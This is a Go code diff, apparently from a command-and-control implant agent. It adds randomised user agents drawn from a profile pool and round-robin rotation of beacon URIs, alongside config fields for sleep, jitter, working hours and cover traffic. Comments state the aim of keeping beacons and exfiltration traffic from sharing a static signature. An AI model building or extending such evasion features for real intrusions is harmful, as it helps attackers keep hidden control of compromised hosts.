@@ -10,21 +10,22 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 )
 
 type ConfigOverride struct {
-	Sleep        int               `json:"sleep"`
-	Jitter       int               `json:"jitter"`
-	UserAgent    string            `json:"user_agent"`
-	Headers      map[string]string `json:"headers"`
-	BeaconURI    string            `json:"beacon_uri"`
-	Method       string            `json:"method"`
-	WorkingStart string            `json:"working_start,omitempty"`
-	WorkingEnd   string            `json:"working_end,omitempty"`
-	WorkingTZ    string            `json:"working_tz,omitempty"`
-	CoverTraffic bool              `json:"cover_traffic,omitempty"`
-	CoverTrafficMax int            `json:"cover_traffic_max,omitempty"`
+	Sleep           int               `json:"sleep"`
+	Jitter          int               `json:"jitter"`
+	UserAgent       string            `json:"user_agent"`
+	Headers         map[string]string `json:"headers"`
+	BeaconURI       string            `json:"beacon_uri"`
+	Method          string            `json:"method"`
+	WorkingStart    string            `json:"working_start,omitempty"`
+	WorkingEnd      string            `json:"working_end,omitempty"`
+	WorkingTZ       string            `json:"working_tz,omitempty"`
+	CoverTraffic    bool              `json:"cover_traffic,omitempty"`
+	CoverTrafficMax int               `json:"cover_traffic_max,omitempty"`
 	// UpdatePubKey pins the self_update signing key (hex ed25519 public).
 	// Delivered over the encrypted session and persisted locally; without it
 	// the agent refuses self_update entirely.
@@ -33,14 +34,14 @@ type ConfigOverride struct {
 
 var configOverrides struct {
 	sync.RWMutex
-	sleep     int // 0 = not set
-	jitter    int // 0 = not set
-	userAgent string
-	headers   map[string]string
-	beaconURI string
-	method    string
-	hasSleep  bool
-	hasJitter bool
+	sleep           int // 0 = not set
+	jitter          int // 0 = not set
+	userAgent       string
+	headers         map[string]string
+	beaconURI       string
+	method          string
+	hasSleep        bool
+	hasJitter       bool
 	coverTraffic    bool
 	coverTrafficMax int
 }
@@ -157,9 +158,10 @@ var defaultUserAgentPool = []string{
 	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
 }
 
-// randomUserAgent returns a UA drawn from the configured UA plus the built-in
-// pool. Called on every outbound request so no two beacons/exfils share a
-// static UA. math/rand is concurrency-safe and requires no explicit seeding.
+// randomUserAgent returns a UA drawn from the v2 profile pool (if set), the
+// configured UA, plus the built-in pool. Called on every outbound request so
+// no two beacons/exfils share a static UA. math/rand is concurrency-safe and
+// requires no explicit seeding.
 func randomUserAgent() string {
 	configOverrides.RLock()
 	base := UserAgent
@@ -167,7 +169,13 @@ func randomUserAgent() string {
 		base = configOverrides.userAgent
 	}
 	configOverrides.RUnlock()
-	pool := append([]string{base}, defaultUserAgentPool...)
+	pool := []string{base}
+	for _, line := range strings.Split(UserAgentsStr, "\n") {
+		if ua := strings.TrimSpace(line); ua != "" {
+			pool = append(pool, ua)
+		}
+	}
+	pool = append(pool, defaultUserAgentPool...)
 	return pool[rand.Intn(len(pool))]
 }
 
@@ -201,6 +209,32 @@ func getActiveHeaders() map[string]string {
 	return nil
 }
 
+var beaconURICounter atomic.Uint64
+
+// parseBeaconURIList splits the comma-joined v2 rotation list, dropping
+// blanks. Order is preserved: index 0 is the primary URI.
+func parseBeaconURIList(joined string) []string {
+	var out []string
+	for _, part := range strings.Split(joined, ",") {
+		if u := strings.TrimSpace(part); u != "" {
+			out = append(out, u)
+		}
+	}
+	return out
+}
+
+// rotatedBeaconURI picks the next URI from the v2 rotation list in strict
+// round-robin order so consecutive beacons spread across all profile URIs.
+// A single-entry (or empty) list returns uri unchanged.
+func rotatedBeaconURI(uri, joined string) string {
+	list := parseBeaconURIList(joined)
+	if len(list) <= 1 {
+		return uri
+	}
+	n := beaconURICounter.Add(1) - 1
+	return list[int(n%uint64(len(list)))]
+}
+
 func getActiveBeaconURIFromConfig() string {
 	configOverrides.RLock()
 	uri := configOverrides.beaconURI
@@ -208,7 +242,13 @@ func getActiveBeaconURIFromConfig() string {
 	if uri != "" {
 		return uri
 	}
-	return getActiveBeaconURI()
+	base := getActiveBeaconURI()
+	if BeaconURIsStr != "" {
+		if rotated := rotatedBeaconURI(base, BeaconURIsStr); rotated != "" {
+			return rotated
+		}
+	}
+	return base
 }
 
 // beaconWSURI returns the WebSocket beacon path for the configured URI. The
